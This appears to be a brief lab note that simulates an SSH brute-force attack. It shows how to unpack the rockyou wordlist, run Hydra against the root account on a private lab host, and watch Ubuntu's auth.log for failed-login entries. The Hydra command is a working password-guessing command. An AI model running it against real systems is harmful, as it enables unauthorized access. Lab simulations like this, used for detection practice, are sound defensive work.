# SSH Brute-Force Attack Simulation

“hydra -l root -P rockyou.txt… ssh://10.0.0.10”

## Prepare Wordlist
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz

## Run Hydra
hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 ssh://10.0.0.10

## Observe Logs on Ubuntu
sudo tail -f /var/log/auth.log

Expected entries:
- Failed password
- Invalid user
- Connection closed
